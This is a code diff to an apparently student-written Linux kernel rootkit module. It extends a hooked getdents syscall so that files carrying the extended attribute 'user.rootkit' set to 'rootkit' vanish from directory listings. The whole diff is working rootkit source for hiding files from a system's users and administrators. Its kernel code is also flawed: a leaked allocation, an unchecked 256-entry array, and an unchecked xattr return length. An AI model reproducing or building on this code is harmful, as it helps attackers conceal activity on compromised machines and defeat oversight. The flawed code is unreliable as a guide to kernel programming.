@@ -71,6 +71,17 @@ must_hide(struct dentry *dentry)
 }
 
 
+static int
+g7_compare_inodes(unsigned long inode, unsigned long *ino_array, int ino_count)
+{
+    for(int i = 0; i < ino_count; i++)
+        if(inode == ino_array[i])
+            return 1;
+
+    return 0;
+}
+
+
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
 asmlinkage long
@@ -97,10 +108,33 @@ g7_getdents(const struct pt_regs *pt_regs)
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
     kdirent_inode = kdirent_dentry->d_inode;
 
+    //Store all inode numbers that have xattrs set
+    //TODO better implementation, a limit of 256 is stupid (or is it?)
+    unsigned long *ino_array;
+    int ino_count;
+    ino_array = kmalloc(256 * sizeof(unsigned long), GFP_KERNEL);
+    ino_count = 0;
+
+    // TODO
+    struct list_head *i;
+    list_for_each(i, &kdirent_dentry->d_subdirs) {
+        struct dentry *child = list_entry(i, struct dentry, d_child);
+        if(child && child->d_inode)
+            if(!inode_permission(child->d_inode, MAY_READ)) {
+                char* buf = kmalloc(256, GFP_KERNEL);
+                ssize_t sz = vfs_getxattr(child, "user.rootkit", buf, 256);
+
+                if(!strncmp("rootkit", buf, sz))
+                    ino_array[ino_count++] = child->d_inode->i_ino;
+
+                kfree(buf);
+            }
+    }
+
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
 
-        if (false) { // TODO: detect xattrs user.rootkit = rootkit
+        if (g7_compare_inodes(cur_kdirent->d_ino, ino_array, ino_count)) { // TODO: detect xattrs user.rootkit = rootkit
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
                 memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
@@ -119,17 +153,6 @@ g7_getdents(const struct pt_regs *pt_regs)
 yield:
     kfree(kdirent);
     return ret;
-}
-
-
-static int
-g7_compare_inodes(unsigned long inode, unsigned long *ino_array, int ino_count)
-{
-    for(int i = 0; i < ino_count; i++)
-        if(inode == ino_array[i])
-            return 1;
-
-    return 0;
 }
 
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
